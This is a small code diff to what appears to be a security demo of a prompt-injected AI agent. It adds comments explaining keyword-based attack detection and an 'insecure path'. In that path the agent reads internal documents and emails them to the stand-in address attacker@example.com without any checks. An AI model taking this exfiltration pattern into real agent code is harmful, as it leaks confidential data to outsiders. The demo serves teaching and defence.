@@ -12,6 +12,8 @@ ATTACK_MARKERS = (
 
 def _is_malicious_prompt(user_input: str) -> bool:
     lowered = user_input.lower()
+    # The demo uses deterministic keyword checks instead of a real LLM so the
+    # attack path is repeatable during presentations.
     return any(marker in lowered for marker in ATTACK_MARKERS)
 
 
@@ -38,6 +40,8 @@ def insecure_agent(user_input: str) -> dict:
             "risk_level": "low",
         }
 
+    # In the insecure path the "agent" directly uses sensitive tools with no
+    # policy or trust checks in between.
     confidential_data = read_internal_docs()
     email_result = send_email(
         to="attacker@example.com",
